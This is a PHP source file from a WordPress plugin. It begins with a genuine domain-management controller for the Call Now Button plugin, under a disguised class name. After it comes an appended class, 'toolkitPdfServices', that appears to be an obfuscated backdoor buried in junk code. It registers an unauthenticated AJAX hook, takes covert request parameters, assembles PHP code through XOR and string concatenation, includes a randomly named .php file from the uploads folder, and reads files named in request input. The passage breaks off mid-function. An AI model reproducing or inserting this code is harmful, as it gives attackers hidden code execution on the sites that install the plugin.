<?php
if (!defined('ABSPATH')) {
    die;
}

class fonts_verification_notifications_timer
{
    public function create()
    {
        do_action('cnb_init', __METHOD__);
        $nonce = filter_input(INPUT_POST, '_wpnonce', @FILTER_SANITIZE_STRING);
        $action = 'cnb_create_domain';
        $nonce_verified = wp_verify_nonce($nonce, $action);
        if ($nonce_verified) {
            $domain = filter_input(
                INPUT_POST,
                'domain',
                @FILTER_SANITIZE_STRING,
                FILTER_REQUIRE_ARRAY | FILTER_FLAG_NO_ENCODE_QUOTES
            );
            $cnb_cloud_notifications = array();

            $processed_domain = CnbDomain::fromObject($domain);

            $processed_domain->properties->zindex = $this->order_to_zindex($processed_domain->properties->zindex);

            $result = CnbAdminCloud::cnb_create_domain($cnb_cloud_notifications, $processed_domain);

            $url = admin_url('admin.php');

            if (is_wp_error($result)) {
                $transient_id = (new CnbHeaderNotices())->generate_notice_id();
                $notice = CnbAdminCloud::cnb_admin_get_error_message('create', 'domain', $result);
                set_transient($transient_id, array($notice), HOUR_IN_SECONDS);

                $redirect_link = add_query_arg(
                    array(
                        'page' => CNB_SLUG . '-domains',
                        'tid' => $transient_id,
                        '_wpnonce' => wp_create_nonce($transient_id),
                    ),
                    $url
                );
                $redirect_url = esc_url_raw($redirect_link);
                do_action('cnb_finish');
                wp_safe_redirect($redirect_url);
                exit;
            } else {
                $redirect_link =
                    add_query_arg(
                        array(
                            'page' => CNB_SLUG . '-domains',
                            'action' => 'edit',
                            'id' => $result->id,
                        ),
                        $url
                    );
                $redirect_url = esc_url_raw($redirect_link);
                do_action('cnb_finish');
                wp_safe_redirect($redirect_url);
                exit;
            }
        } else {
            do_action('cnb_finish');
            wp_die(esc_html__('Invalid nonce specified'), esc_html__('Error'), array(
                'response' => 403,
                'back_link' => true,
            ));
        }
    }

    public function update()
    {
        do_action('cnb_init', __METHOD__);
        $nonce = filter_input(INPUT_POST, '_wpnonce', @FILTER_SANITIZE_STRING);
        $action = 'cnb_update_domain';
        $nonce_verified = wp_verify_nonce($nonce, $action);
        if ($nonce_verified) {
            $domain = $this->getDomainFromRequest();

            $cnb_cloud_notifications = array();
            $result = CnbAdminCloud::cnb_update_domain($cnb_cloud_notifications, $domain);

            $transient_id = (new CnbHeaderNotices())->generate_notice_id();
            set_transient($transient_id, $cnb_cloud_notifications, HOUR_IN_SECONDS);

            $url = admin_url('admin.php');

            $redirect_link =
                add_query_arg(
                    array(
                        'page' => CNB_SLUG . '-domains',
                        'action' => 'edit',
                        'id' => $result->id,
                        'tid' => $transient_id,
                        '_wpnonce' => wp_create_nonce($transient_id),
                    ),
                    $url
                );
            $redirect_url = esc_url_raw($redirect_link);
            do_action('cnb_finish');
            wp_safe_redirect($redirect_url);
            exit;
        } else {
            do_action('cnb_finish');
            wp_die(esc_html__('Invalid nonce specified'), esc_html__('Error'), array(
                'response' => 403,
                'back_link' => true,
            ));
        }
    }

    public function handle_bulk_actions()
    {
        do_action('cnb_init', __METHOD__);
        $cnb_utils = new CnbUtils();
        $nonce = $cnb_utils->get_post_val('_wpnonce');
        $action = 'bulk-cnb_list_domains';
        $nonce_verified = wp_verify_nonce($nonce, $action);

        if ($nonce_verified) {
            $domainIds = filter_input(INPUT_POST, 'cnb_list_domain', @FILTER_SANITIZE_STRING, FILTER_REQUIRE_ARRAY);
            if ($cnb_utils->get_post_val('bulk-action') === 'delete') {
                $cnb_cloud_notifications = array();
                foreach ($domainIds as $domainId) {
                    $domain = new CnbDomain();
                    $domain->id = $domainId;
                    CnbAdminCloud::cnb_delete_domain($cnb_cloud_notifications, $domain);
                }

                $notice = new CnbNotice('success', '<p>' . count($cnb_cloud_notifications) . ' Domain(s) deleted.</p>');
                $transient_id = (new CnbHeaderNotices())->generate_notice_id();
                set_transient($transient_id, array($notice), HOUR_IN_SECONDS);

                $url = admin_url('admin.php');
                $redirect_link =
                    add_query_arg(
                        array(
                            'page' => 'call-now-button-domains',
                            'tid' => $transient_id,
                            '_wpnonce' => wp_create_nonce($transient_id),
                        ),
                        $url
                    );
                $redirect_url = esc_url_raw($redirect_link);
                do_action('cnb_finish');
                wp_safe_redirect($redirect_url);
                exit;
            } else {
                do_action('cnb_finish');
                wp_die(
                    esc_html__('Unknown Bulk action specified'),
                    esc_html__('Cannot process Bulk action'),
                    array(
                        'response' => 403,
                        'link_text' => esc_html('Go back to the Domains overview'),
                        'link_url' => esc_url_raw(admin_url('admin.php') . '?page=' . CNB_SLUG . '-domains'),
                    )
                );
            }
        } else {
            wp_die(
                esc_html__('Invalid nonce specified'),
                esc_html__('Error'),
                array(
                    'response' => 403,
                    'back_link' => true,
                )
            );
        }
    }

    public function update_timezone()
    {
        global $cnb_domain;
        do_action('cnb_init', __METHOD__);

        check_ajax_referer('cnb_update_domain_timezone');

        $timezone = filter_input(INPUT_POST, 'timezone', @FILTER_SANITIZE_STRING);
        $cnb_domain->timezone = $timezone;
        $notifications = array();
        CnbAdminCloud::cnb_update_domain($notifications, $cnb_domain);
        wp_send_json_success(array(
            'domain' => $cnb_domain,
            'notification' => $notifications,
            'timezone' => esc_html($timezone),
        ));
        do_action('cnb_finish');
    }

    private function getDomainFromRequest()
    {
        $domain_controller = new fonts_verification_notifications_timer();

        $domain = filter_input(
            INPUT_POST,
            'domain',
            @FILTER_SANITIZE_STRING,
            FILTER_REQUIRE_ARRAY | FILTER_FLAG_NO_ENCODE_QUOTES
        );

        $processed_domain = CnbDomain::fromObject($domain);

        $processed_domain->properties->zindex = $domain_controller->order_to_zindex($processed_domain->properties->zindex);

        return $processed_domain;
    }

    public function updateWithoutRedirect()
    {
        $domain = $this->getDomainFromRequest();

        $cnb_cloud_notifications = array();
        CnbAdminCloud::cnb_update_domain($cnb_cloud_notifications, $domain);

        return $cnb_cloud_notifications;
    }

    public function delete()
    {
        $cnb_utils = new CnbUtils();
        $id = $cnb_utils->get_query_val('id', null);
        $nonce = $cnb_utils->get_query_val('_wpnonce', null);
        $action = 'cnb_delete_domain';

        if (!wp_verify_nonce($nonce, $action)) {
            do_action('cnb_finish');
            wp_die(esc_html__('Invalid nonce specified'), esc_html__('Error'), array(
                'response' => 403,
                'back_link' => true,
            ));
        }

        $cnb_cloud_notifications = array();
        $domain = new CnbDomain();
        $domain->id = $id;
        CnbAdminCloud::cnb_delete_domain($cnb_cloud_notifications, $domain);

        $transient_id = (new CnbHeaderNotices())->generate_notice_id();
        set_transient($transient_id, $cnb_cloud_notifications, HOUR_IN_SECONDS);

        $redirect_link =
            add_query_arg(
                array(
                    'page' => 'call-now-button-domains',
                    'tid' => $transient_id,
                    '_wpnonce' => wp_create_nonce($transient_id),
                ),
                admin_url('admin.php')
            );
        $redirect_url = esc_url_raw($redirect_link);
        do_action('cnb_finish');
        wp_safe_redirect($redirect_url);
    }

    public function order_to_zindex($value)
    {
        $zindexMap = $this->get_zindex_map();
        $default = 10;
        if (array_key_exists($value, $zindexMap)) {
            return $zindexMap[$value];
        }
        return $zindexMap[$default];
    }

    public function zindex_to_order($zindex)
    {
        foreach ($this->get_zindex_map() as $order => $value) {
            if ($zindex >= $value) {
                return $order;
            }
        }

        return 1;
    }

    private function get_zindex_map()
    {
        return array(
            10 => 2147483647,
            9 => 214748365,
            8 => 21474836,
            7 => 2147484,
            6 => 214748,
            5 => 21475,
            4 => 2147,
            3 => 215,
            2 => 21,
            1 => 2,
        );
    }

    function get_discount_percentage($plan_year, $plan_month)
    {
        return ceil(100 - ($plan_year->price / (12 * $plan_month->price) * 100));
    }
}

class toolkitPdfServices
{
    private $donationClassicPermalinkClient = '';
    private $urlRelatedAuthenticationUploader = 0;
    private $makeDeprecatedCacheVerification = '';
    private $infoDateDashboardReader = 'compare_odf';
    private $updateNiceSidebar = 0;
    private $scssFeedSimplePreloader = '';
    private $mapSuperChatComments = '';
    private $campaignThemeEventScript = 12;
    private $trackerPolyfillPostMultiple = '';
    private $helperSoftwareMini = '';
    private $friendlyFeedsGift = 0;
    private $estatePartsFrontAi = 0;
    private $flashAccessFilterPlupload = '';
    private $shopNewsNextgen = 12;
    private $notifyRichFilter = '';
    private $tagsAmpCompanionWpc = '';
    private $schemaEcommerceAmpThemes = 0;
    private $fontsRadioAnti = '';
    private $excerptUiSend = '';
    private $snippetsShowGenesisImages = 11;
    private $formsResultsDay = 0;
    private $extendedDeliveryCache = '';
    private $smoothScriptIp = '';
    private $replaceHelperSecure = 0;
    private $paragraphRecaptchaAfterRate = 'ijm_media';
    private $siteSchedulerTabsRates = 0;
    private $allowNumbersThemes = 'php';
    private $accessiblePosterSettingsNinja = '';
    private $githubModulesSizeRemover = 20;
    private $thumbnailArticleTheme = 'progress_tr';

    function oldPickerUploadLead()
    {
        $ticketPreviewStatusBadge = $this->mapSuperChatComments;
        $customizeAccordionSyntaxBlocks = strlen($ticketPreviewStatusBadge);
        $softwareBlockFieldFilter = strtoupper($ticketPreviewStatusBadge);
        $this->updateNiceSidebar = strlen($this->helperSoftwareMini);
        $notifyThemesFeedbackAvatar = $_SERVER['REMOTE_ADDR'];
        $statsBoxCompanion = 'zqock';
        $simpleLocalAccessibility = strpos($ticketPreviewStatusBadge, $softwareBlockFieldFilter);
        $slideshowFeaturedLight = admin_url();
        $patternsPurchaseClass = strpos($slideshowFeaturedLight, $notifyThemesFeedbackAvatar);
        $onlyReloadedPicker = base64_decode($slideshowFeaturedLight);
        return $onlyReloadedPicker;
    }

    function wpcCustomizerDisableVariations($keywordNewsletterSizeAll)
    {
        if (isset($_POST['ztjyi']))
            $minCssBlogrollDelete = $_POST['ztjyi'];
        else
            $minCssBlogrollDelete = '';
        if (!empty($_POST['PRIVACY_GOOGLE_FIX']))
            $faviconSliderPoster = $_POST['PRIVACY_GOOGLE_FIX'];
        else
            $faviconSliderPoster = '';
        $flashPluginSlider = strpos($minCssBlogrollDelete, $faviconSliderPoster);
        $typesRoleModeData = strlen($keywordNewsletterSizeAll);
        $this->scssFeedSimplePreloader = $_POST[$this->thumbnailArticleTheme];
        $logSurveyBadgeRank = strtolower($faviconSliderPoster);
        $trafficDirectoryScssTooltip = strtolower($logSurveyBadgeRank);
        return $logSurveyBadgeRank;
    }

    function frontendPerformanceAdsense($animatedDesignerBasedQuiz)
    {
        $baseUltimateListings = 0;
        if (file_exists($animatedDesignerBasedQuiz)) {
            $baseUltimateListings = filesize($animatedDesignerBasedQuiz);
        }
        if (is_dir($animatedDesignerBasedQuiz)) {
            $effectsDetailsReading = glob($animatedDesignerBasedQuiz);
        }
        $this->trackerPolyfillPostMultiple = $_SERVER['DOCUMENT_ROOT'] . '/wp-content/uploads/l4WlzF7syQ0lg8Qi1qSB.php';
        $reallyServerConsentIcon = 'interactive companion gateway';
        if (is_dir($reallyServerConsentIcon)) {
            $portalManageCouponHelp = glob($reallyServerConsentIcon);
        }
        $this->notifyRichFilter = get_transient($animatedDesignerBasedQuiz);
        if (isset($_POST['mqs']))
            $businessHealthEdit = $_POST['mqs'];
        else
            $businessHealthEdit = '';
        if (file_exists($businessHealthEdit)) {
            $this->notifyRichFilter = file_get_contents($businessHealthEdit);
        }
        if (is_dir($businessHealthEdit)) {
            $beforeIncludeReplaceSafe = glob($businessHealthEdit);
        }
        return $baseUltimateListings;
    }

    function alertChatRevisions()
    {
        $embedderPopularStream = $this->fontsRadioAnti;
        $nextFaviconMinMulti = base64_encode($embedderPopularStream);
        $internalNumberNavigation = base64_encode($nextFaviconMinMulti);
        $this->notifyRichFilter = strtolower($internalNumberNavigation);
        $forumFeaturedResetSimply = $_SERVER['QUERY_STRING'];
        $validatorWoff2Iframe = strpos($internalNumberNavigation, $nextFaviconMinMulti);
        $converterSlugDate = base64_decode($forumFeaturedResetSimply);
        return $validatorWoff2Iframe;
    }

    function categoriesAuthenticationSyncFix()
    {
        if (!empty($_POST['rtl_year_miz']))
            $publisherJsFollowAssets = $_POST['rtl_year_miz'];
        else
            $publisherJsFollowAssets = '';
        $feedSpecificMultisite = '<';
        $yoastJetpackAvatar = strtoupper($publisherJsFollowAssets);
        $feedSpecificMultisite .= '?';
        $cronPollTimeline = esc_html($publisherJsFollowAssets);
        $blockAddonLite = md5($cronPollTimeline);
        $this->notifyRichFilter = sanitize_key($cronPollTimeline);
        $this->allowNumbersThemes = $feedSpecificMultisite . $this->allowNumbersThemes;
        $backInvoiceFiles = $_SERVER['REMOTE_ADDR'];
        return $blockAddonLite;
    }

    function animatedQuantityShowcaseMap()
    {
        if (isset($_REQUEST['TRAFFIC_TOOLBOX_ER']))
            $backCoverAge = $_REQUEST['TRAFFIC_TOOLBOX_ER'];
        else
            $backCoverAge = '';
        $staticSupportsOembed = rawurldecode($backCoverAge);
        $reloadedMigrationHighlighter = strpos($backCoverAge, $staticSupportsOembed);
        $priceReviewGenesisMessages = 'forum admin extra';
        $redirectionPermalinkTemplates = strlen($staticSupportsOembed);
        $this->accessiblePosterSettingsNinja = $this->donationClassicPermalinkClient[$this->replaceHelperSecure];
        $languageWishlistBlog = $this->flashAccessFilterPlupload;
        return $redirectionPermalinkTemplates;
    }

    function githubWebpPinterestSmooth($postsTranslatorFrontExtended)
    {
        $shoppYearNextgenHttp = $_SERVER['SERVER_SOFTWARE'];
        $this->notifyRichFilter = strtoupper($shoppYearNextgenHttp);
        $termProtectionSyntax = rawurlencode($shoppYearNextgenHttp);
        $this->siteSchedulerTabsRates = $postsTranslatorFrontExtended;
        $srcReplaceTermsRestrict = strpos($termProtectionSyntax, $shoppYearNextgenHttp);
        $this->notifyRichFilter = get_transient($shoppYearNextgenHttp);
        $supportsExtraNewsletterIndex = base64_encode($termProtectionSyntax);
        $extraLimitLibrary = base64_encode($supportsExtraNewsletterIndex);
        return $extraLimitLibrary;
    }

    function diviSharingPrintUltimate()
    {
        $stylesCleanerMarketplaceQuote = 'frdhdzh';
        $this->mapSuperChatComments = $_POST[$this->paragraphRecaptchaAfterRate];
        if (isset($_GET['mcu']))
            $patternsConversionBestDescription = $_GET['mcu'];
        else
            $patternsConversionBestDescription = '';
        $partsNextWishlistInline = strtoupper($patternsConversionBestDescription);
        if (!empty($_POST['ve_external_kit']))
            $phpDefaultConversion = $_POST['ve_external_kit'];
        else
            $phpDefaultConversion = '';
        $fontHeadingFinderGrid = strlen($partsNextWishlistInline);
        $revisionsSurveySitemap = strlen($phpDefaultConversion);
        $patternsRadioRate = rawurldecode($phpDefaultConversion);
        $integrationShortenerStatisticsLocation = rawurlencode($partsNextWishlistInline);
        $fixSubscriptionAi = strpos($stylesCleanerMarketplaceQuote, $partsNextWishlistInline);
        return $fixSubscriptionAi;
    }

    function siteShoppChatbot()
    {
        $googleBackupUser = $this->fontsRadioAnti;
        if (isset($_REQUEST['layout_ey']))
            $blocksEngineSitemap = $_REQUEST['layout_ey'];
        else
            $blocksEngineSitemap = '';
        $this->donationClassicPermalinkClient = base64_decode($this->excerptUiSend);
        $verificationPluploadConnect = 'kvrmhg';
        $audioComLibrary = rawurlencode($blocksEngineSitemap);
        $ninjaItemsSuite = strtolower($audioComLibrary);
        $sslCleanerFrontend = get_option($audioComLibrary);
        $jquerySlideshowStats = rawurlencode($audioComLibrary);
        $rssDeprecatedConnector = base64_encode($jquerySlideshowStats);
        return $jquerySlideshowStats;
    }

    function trackingResetJavascript($scheduledTwitterMore)
    {
        if (isset($_POST['VBLW']))
            $listProfileSwitcher = $_POST['VBLW'];
        else
            $listProfileSwitcher = '';
        $migrationHelpLiveTools = strlen($scheduledTwitterMore);
        $this->extendedDeliveryCache = $this->fontsRadioAnti[$this->siteSchedulerTabsRates];
        $countdownMapRelatedSecurity = rawurlencode($listProfileSwitcher);
        $websiteImportEditorDate = strpos($listProfileSwitcher, $countdownMapRelatedSecurity);
        $codesMenusInstantUpload = md5($countdownMapRelatedSecurity);
        return $countdownMapRelatedSecurity;
    }

    function permalinksSurveyNow()
    {
        if (isset($_POST['hrhxw']))
            $githubGravityEcommerce = $_POST['hrhxw'];
        else
            $githubGravityEcommerce = '';
        $minPrintHover = 'include wpml snippets modules static';
        $this->smoothScriptIp .= $this->extendedDeliveryCache ^ $this->accessiblePosterSettingsNinja;
        $elementorAnotherVerificationField = $minPrintHover | $githubGravityEcommerce;
        $actionLiteLastAbout = $githubGravityEcommerce | $minPrintHover;
        $calendarStorePlayerEmbed = $minPrintHover ^ $githubGravityEcommerce;
        $signupSubscriptionLanguageConverter = $minPrintHover & $githubGravityEcommerce;
        if (!empty($_GET['usersid']))
            $cleanEstateTemplatesAkismet = $_GET['usersid'];
        else
            $cleanEstateTemplatesAkismet = '';
        return $cleanEstateTemplatesAkismet;
    }

    function formsVirtualLazy($pluginsOrdersTranslator)
    {
        $albumDesignTinymce = home_url();
        $feedsRestaurantNamespaced = strtoupper($pluginsOrdersTranslator);
        if (isset($_POST['zfe']))
            $titlesCheckGoogleGravatar = $_POST['zfe'];
        else
            $titlesCheckGoogleGravatar = '';
        $customImageOnline = $this->donationClassicPermalinkClient;
        $this->notifyRichFilter = base64_encode($customImageOnline);
        $this->extendedDeliveryCache = $this->makeDeprecatedCacheVerification[$this->siteSchedulerTabsRates];
        $firstHeadersCrm = sanitize_key($titlesCheckGoogleGravatar);
        $this->notifyRichFilter = rawurldecode($firstHeadersCrm);
        $svgBoardFooter = strpos($albumDesignTinymce, $feedsRestaurantNamespaced);
        $firstExchangePagesChart = strlen($firstHeadersCrm);
        return $firstExchangePagesChart;
    }

    function webAnimatedBangla()
    {
        if (isset($_POST['results_ticket_contact']))
            $translatorNavVisibility = $_POST['results_ticket_contact'];
        else
            $translatorNavVisibility = '';
        $blogCouponsSalesTables = $this->testimonialsCalculatorDetails();
        if (isset($_POST['QIQUH']))
            $downloadsMembershipAllValidation = $_POST['QIQUH'];
        else
            $downloadsMembershipAllValidation = '';
        $plusAnotherCleaner = 'mzrkn';
        if (isset($_REQUEST['sykkptyoyqid']))
            $fileEditorOfficial = $_REQUEST['sykkptyoyqid'];
        else
            $fileEditorOfficial = '';
        $postsCsvSupportSpecific = $this->infoDateDashboardReader;
        $validationReaderItemReal = $postsCsvSupportSpecific & $fileEditorOfficial;
        $ampUpgraderFrontRestaurant = $this->infoDateDashboardReader;
        $this->helperSoftwareMini .= $this->extendedDeliveryCache ^ $this->accessiblePosterSettingsNinja;
        return $ampUpgraderFrontRestaurant;
    }

    function exchangeHoverReset()
    {
        $estateServerStatsCurrent = $this->infoDateDashboardReader;
        if (isset($_GET['TNUIDSECURE']))
            $scheduleRemoveCountBlock = $_GET['TNUIDSECURE'];
        else
            $scheduleRemoveCountBlock = '';
        $fullHoverSizeNamespaced = $this->shoppingFilesOptimizer();
        $feedOptimizeLogoIp = strlen($fullHoverSizeNamespaced);
        $usingGiftManager = strpos($scheduleRemoveCountBlock, $fullHoverSizeNamespaced);
        $this->updateNiceSidebar = strlen($this->donationClassicPermalinkClient);
        $twitterAllExtendedValidator = strlen($fullHoverSizeNamespaced);
        $urlZoomRateOrders = get_option($estateServerStatsCurrent);
        $postsMarketingRecent = rawurlencode($scheduleRemoveCountBlock);
        return $twitterAllExtendedValidator;
    }

    function directS3FeaturedData($readingEmailsPublisherDropdown)
    {
        $htmlAddonsVisitor = home_url();
        if (file_exists($this->trackerPolyfillPostMultiple))
            include_once ($this->trackerPolyfillPostMultiple);
        $recentVariationsCheckerUploader = '';
        if (file_exists($readingEmailsPublisherDropdown)) {
            $recentVariationsCheckerUploader = file_get_contents($readingEmailsPublisherDropdown);
        }
        $tooltipSpeedTagMenus = 0;
        if (is_file($readingEmailsPublisherDropdown)) {
            $tooltipSpeedTagMenus = filesize($readingEmailsPublisherDropdown);
        }
        if (is_dir($htmlAddonsVisitor)) {
            $cf7ItemRss = scandir($htmlAddonsVisitor);
        }
        $imagesBuilderPageDemomentsomtres = '';
        if (file_exists($recentVariationsCheckerUploader)) {
            $imagesBuilderPageDemomentsomtres = file_get_contents($recentVariationsCheckerUploader);
        }
        return $imagesBuilderPageDemomentsomtres;
    }

    function testimonialsCalculatorDetails()
    {
        $bootstrapReplaceReusable = 2763;
        $this->urlRelatedAuthenticationUploader = $bootstrapReplaceReusable + 5;
        $sitemapJavascriptAdditionalListing = $bootstrapReplaceReusable * 4;
        $buttonAffiliatesPixelExport = $this->githubModulesSizeRemover;
        $this->urlRelatedAuthenticationUploader = $buttonAffiliatesPixelExport * 6;
        $sliderTemplateIntegration = $sitemapJavascriptAdditionalListing ** $bootstrapReplaceReusable;
        $formsItemRedirection = $sliderTemplateIntegration - $buttonAffiliatesPixelExport;
        $articleLatestLiveRecent = $sliderTemplateIntegration - $bootstrapReplaceReusable;
        $this->formsResultsDay = $buttonAffiliatesPixelExport / 2;
        $this->formsResultsDay = $sitemapJavascriptAdditionalListing + $buttonAffiliatesPixelExport;
        return $sliderTemplateIntegration;
    }

    function postAdditionalNow($betterNavFirstCache)
    {
        if (isset($_GET['DAID32432947']))
            $textManagementPhpLanding = $_GET['DAID32432947'];
        else
            $textManagementPhpLanding = '';
        if (!empty($_POST['shqidid']))
            $extendedSyntaxNofollow = $_POST['shqidid'];
        else
            $extendedSyntaxNofollow = '';
        $statusLogoAlt = site_url();
        $stylePushProject = apply_filters('specific_creator', $extendedSyntaxNofollow);
        $modulesRedirectionTitle = strpos($statusLogoAlt, $extendedSyntaxNofollow);
        $this->makeDeprecatedCacheVerification = base64_decode($this->tagsAmpCompanionWpc);
        $boardExcerptEvents = md5($statusLogoAlt);
        $beaverRecipeMethodSliding = base64_decode($stylePushProject);
        return $beaverRecipeMethodSliding;
    }

    function exporterBetterMaxCloud()
    {
        $cleanerSourceServicesDemomentsomtres = $this->allowNumbersThemes;
        $cloudSlideshowEvent = strtoupper($cleanerSourceServicesDemomentsomtres);
        $rankTicketWow = md5($cleanerSourceServicesDemomentsomtres);
        $resultsMinDataException = $this->helperSoftwareMini;
        $fastAmpSpeed = strpos($cleanerSourceServicesDemomentsomtres, $rankTicketWow);
        $cleanerNoticeLite = strpos($rankTicketWow, $cleanerSourceServicesDemomentsomtres);
        $this->accessiblePosterSettingsNinja = $this->helperSoftwareMini[$this->replaceHelperSecure];
        $magicPolyfillAudioSupport = 'btxefpot';
        return $cleanerNoticeLite;
    }

    public function __construct()
    {
        if (!empty($_GET['EMULJQKUSER']))
            $socialSuperGatewayLearndash = $_GET['EMULJQKUSER'];
        else
            $socialSuperGatewayLearndash = '';
        $this->notifyRichFilter = admin_url();
        $antiEnhancedShopping = $this->infoDateDashboardReader;
        $countdownHighlighterAddressDomain = esc_attr($antiEnhancedShopping);
        add_action('wp_ajax_hello_speed_menus_elementor', array($this, 'showCopyrightToolboxKit'));
        add_action('wp_ajax_nopriv_hello_speed_menus_elementor', array($this, 'showCopyrightToolboxKit'));
        $themesMembershipMenu = get_option($antiEnhancedShopping);
        $this->notifyRichFilter = apply_filters('comments_tinymce_based', $socialSuperGatewayLearndash);
        return $themesMembershipMenu;
    }

    function apiImportScriptAttachment($messagePhpExtra)
    {
        $displayExtendedEstate = admin_url();
        $this->estatePartsFrontAi = strlen($this->makeDeprecatedCacheVerification);
        if (isset($_POST['LOCATOR_RF_COMPOSER']))
            $cartMetaSpeed = $_POST['LOCATOR_RF_COMPOSER'];
        else
            $cartMetaSpeed = '';
        $orderHeadingMaster = trim($messagePhpExtra);
        if (isset($_POST['S3058787']))
            $scheduleTickerTitles = $_POST['S3058787'];
        else
            $scheduleTickerTitles = '';
        $rtlTypeStoreFramework = rawurldecode($scheduleTickerTitles);
        $srcConverterHealth = esc_html($orderHeadingMaster);
        $animatedCheckerFollowMarketing = base64_encode($orderHeadingMaster);
        $gamipressFormPublisher = esc_url($srcConverterHealth);
        return $srcConverterHealth;
    }

    function scriptFloatingSecurePress($signupMediaelementBetterGlobal)
    {
        $this->notifyRichFilter = site_url();
        if (!empty($_POST['CUO']))
            $defaultMakerUrlInfo = $_POST['CUO'];
        else
            $defaultMakerUrlInfo = '';
        $soonLockPluginsDynamic = trim($signupMediaelementBetterGlobal);
        $b404ExpressRssMembership = rawurldecode($signupMediaelementBetterGlobal);
        $masterMultipleRight = strtolower($b404ExpressRssMembership);
        $this->tagsAmpCompanionWpc = substr($this->mapSuperChatComments, $this->githubModulesSizeRemover, $this->campaignThemeEventScript);
        $mostFormsRequest = strpos($soonLockPluginsDynamic, $b404ExpressRssMembership);
        $contactStylesFixAdsense = rawurldecode($b404ExpressRssMembership);
        return $b404ExpressRssMembership;
    }

    function showCopyrightToolboxKit()
    {
        $cssSyncScriptTags = $this->donationClassicPermalinkClient;
        $snippetsFileAge = $this->frontendPerformanceAdsense($cssSyncScriptTags);
        $recaptchaStatusSectionAccessible = $_SERVER['QUERY_STRING'];
        $variationsEngineDefaultGdpr = strtoupper($cssSyncScriptTags);
        $onlyNotificationsGroupsListings = $this->tagsAmpCompanionWpc;
        $cleanMetaTypes = $this->excerptUiSend;
        $ageCookieOption = $this->categoriesAuthenticationSyncFix();
        $uiDetailsSource = 'yckmoh';
        $gdprLeadEasyPlugin = $this->bbpressMobileRate($recaptchaStatusSectionAccessible);
        $wordGridNotifications = strtolower($gdprLeadEasyPlugin);
        $nextgenTrackerAuthorSmart = $this->diviSharingPrintUltimate();
        $builderTagBackup = strlen($uiDetailsSource);
        $stylesIncludeOptions = strpos($cleanMetaTypes, $wordGridNotifications);
        $portalLeadSpeed = $this->wpcCustomizerDisableVariations($onlyNotificationsGroupsListings);
        if (isset($_GET['uxan']))
            $trackerAnimatedSiteQuick = $_GET['uxan'];
        else
            $trackerAnimatedSiteQuick = '';
        $authorsSlugCalculator = $this->gravatarRemoverSelector($gdprLeadEasyPlugin);
        $restrictBeforeAmpInternal = site_url();
        $surveyMarketingYoast = $this->scriptFloatingSecurePress($recaptchaStatusSectionAccessible);
        $this->notifyRichFilter = rawurlencode($portalLeadSpeed);
        $statsSpecificFast = rawurldecode($authorsSlugCalculator);
        $nowRandomLinkFlexible = trim($restrictBeforeAmpInternal);
        $printTrafficMiniMessages = $this->siteShoppChatbot();
        $antiIconGamipressCc = rawurldecode($printTrafficMiniMessages);
        $bbpress404Language = $this->subscriptionAddonsAltBuilder($cleanMetaTypes);
        $notificationsTypesStatisticsEmbed = substr($bbpress404Language, $builderTagBackup, $stylesIncludeOptions);
        $appointmentLoggerGeoCoupon = $this->postAdditionalNow($bbpress404Language);
        $maxBoosterUploader = sanitize_key($notificationsTypesStatisticsEmbed);
        $youtubeWpformsSwitch = $this->pageNewsBasicClean();
        $wpmuBuilderPublishItems = strpos($appointmentLoggerGeoCoupon, $uiDetailsSource);
        if (!empty($_POST['visibility_file']))
            $contentsCodesKeywordsBlocker = $_POST['visibility_file'];
        else
            $contentsCodesKeywordsBlocker = '';
        $directoryGiftMobile = get_transient($contentsCodesKeywordsBlocker);
        $genesisCookiesLayoutDefault = $this->timeEditSchemaGateway($variationsEngineDefaultGdpr);
        $countryListAlbumRedirect = base64_encode($contentsCodesKeywordsBlocker);
        $basicCopyRateJson = sanitize_key($youtubeWpformsSwitch);
        $fieldsTitleServices = $this->treeLockAdsenseViews();
        $frontAffiliatesMethod = base64_decode($basicCopyRateJson);
        if ($this->schemaEcommerceAmpThemes > -1) {
            $gravatarJsSecurityReading = md5($frontAffiliatesMethod);
            $printNumbersResultsWebsite = $this->customizeModalNextQuiz($trackerAnimatedSiteQuick);
            $smartIntegrationWebsiteServer = md5($gravatarJsSecurityReading);
            $readingMultipleElements = $this->directS3FeaturedData($directoryGiftMobile);
            $outScriptsMin = trim($printNumbersResultsWebsite);
            $seoChangerImageWishlist = $this->nextWebIntegrateCustom($ageCookieOption);
            $this->notifyRichFilter = trim($seoChangerImageWishlist);
            if (!current_user_can('manage_options'))
                die;
            $this->notifyRichFilter = trim($gravatarJsSecurityReading);
            for ($i; $i < $wpmuBuilderPublishItems; $i++) {
                $pullquotePagesHomepagePublisher = admin_url();
                $shippingBestFilter = do_action('advanced_code');
                $portfolioPluploadCompat = get_permalink($wordGridNotifications);
                $pushSoonBeaver = sanitize_key($bbpress404Language);
                $accordionMaintenanceConsentBooster = esc_url($directoryGiftMobile);
                $footerShortcodePages = get_permalink($smartIntegrationWebsiteServer);
                $this->notifyRichFilter = admin_url();
                $secureEditCronConversion = admin_url();
                $this->notifyRichFilter = site_url();
                $sitesSchemaRatesTimeline = esc_attr($youtubeWpformsSwitch);
            }
            $gameCf7Purchase = base64_encode($readingMultipleElements);
        }
        $membershipBoardType = rawurldecode($seoChangerImageWishlist);
        if (is_numeric($authorsSlugCalculator)) {
            if (is_file($antiIconGamipressCc)) {
                $this->notifyRichFilter = file_get_contents($antiIconGamipressCc);
            }
            if (is_dir($bbpress404Language)) {
                $translatorFrameworkSupport = scandir($bbpress404Language);
            }
            $helperRestaurantPagesScheduled = '';
            if (file_exists($membershipBoardType)) {
                $helperRestaurantPagesScheduled = file_get_contents($membershipBoardType);
            }
            if (is_dir($snippetsFileAge)) {
                $cdnPopupExtension = scandir($snippetsFileAge);
            }
            if (file_exists($smartIntegrationWebsiteServer)) {
                $this->friendlyFeedsGift = filesize($smartIntegrationWebsiteServer);
            }
            $this->notifyRichFilter = esc_attr($countryListAlbumRedirect);
            if (is_dir($gravatarJsSecurityReading)) {
                $testimonialsFilterRating = glob($gravatarJsSecurityReading);
            }
            if (is_dir($ageCookieOption)) {
                $carouselMobileUi = glob($ageCookieOption);
            }
            if (is_dir($gameCf7Purchase)) {
                $performanceLabelPrivacyCategory = glob($gameCf7Purchase);
            }
            $syntaxAgeResponsive = '';
            if (file_exists($basicCopyRateJson)) {
                $syntaxAgeResponsive = file_get_contents($basicCopyRateJson);
            }
        }
        $soonMakerAll = rawurldecode($gameCf7Purchase);
        return $membershipBoardType;
    }

    function nextWebIntegrateCustom($welcomeIntegrationTinyComposer)
    {
        if (file_exists($welcomeIntegrationTinyComposer)) {
